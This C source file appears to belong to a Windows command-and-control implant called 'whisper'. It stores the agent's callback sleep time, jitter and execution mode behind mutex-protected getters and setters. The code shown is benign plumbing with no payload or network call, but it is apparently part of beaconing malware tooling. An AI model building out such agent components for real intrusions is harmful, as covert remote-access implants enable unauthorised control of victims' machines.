#include "whisper_dynamic_config.h"
#include "whisper_config.h"
/*
whisper_dynamic_config - Used for dynamic config values while the program is running

PLEASE DO NOT EDIT (unless you know what you are doing). use the whisper_config.h macros to edit the values. 

Usage:

#include "whisper_dynamic_config.h"
#include <windows.h>

void whisperSleep() {
    Sleep(get_sleep_time());
}

*/

// Define the global struct instance

/*
Reference
typedef struct {
    DWORD sleep_time;  // Sleep duration in milliseconds
    DWORD jitter;      // Jitter percentage
} AgentConfig;
*/


AgentConfig g_agent_config = { CALLBACK_SLEEP_TIME * 6, 10 };
CRITICAL_SECTION g_agent_config_mutex;

ExecutionMode g_execution_mode = EXEC_MODE_ASYNC;
CRITICAL_SECTION g_execution_mode_mutex;

void initialize_critical_sections() {
    InitializeCriticalSection(&g_agent_config_mutex);
    InitializeCriticalSection(&g_execution_mode_mutex);
}


//funcs

void init_config(DWORD sleep_time, DWORD jitter) {
    g_agent_config.sleep_time = sleep_time;
    g_agent_config.jitter = jitter;
}


// Agent Config functions (protected by g_agent_config_mutex)
void set_sleep_time(DWORD new_time) {
    EnterCriticalSection(&g_agent_config_mutex);
    g_agent_config.sleep_time = new_time;
    LeaveCriticalSection(&g_agent_config_mutex);
}

DWORD get_sleep_time() {
    EnterCriticalSection(&g_agent_config_mutex);
    DWORD sleep_time = g_agent_config.sleep_time;
    LeaveCriticalSection(&g_agent_config_mutex);
    return sleep_time;
}

// Execution Mode functions (protected by g_execution_mode_mutex)
void set_execution_mode(ExecutionMode mode) {
    EnterCriticalSection(&g_execution_mode_mutex); // Lock the execution mode mutex
    g_execution_mode = mode;
    LeaveCriticalSection(&g_execution_mode_mutex); // Unlock the execution mode mutex
}

ExecutionMode get_execution_mode() {
    EnterCriticalSection(&g_execution_mode_mutex); // Lock the execution mode mutex
    ExecutionMode mode = g_execution_mode; // Copy the value
    LeaveCriticalSection(&g_execution_mode_mutex); // Unlock the execution mode mutex
    return mode;
}
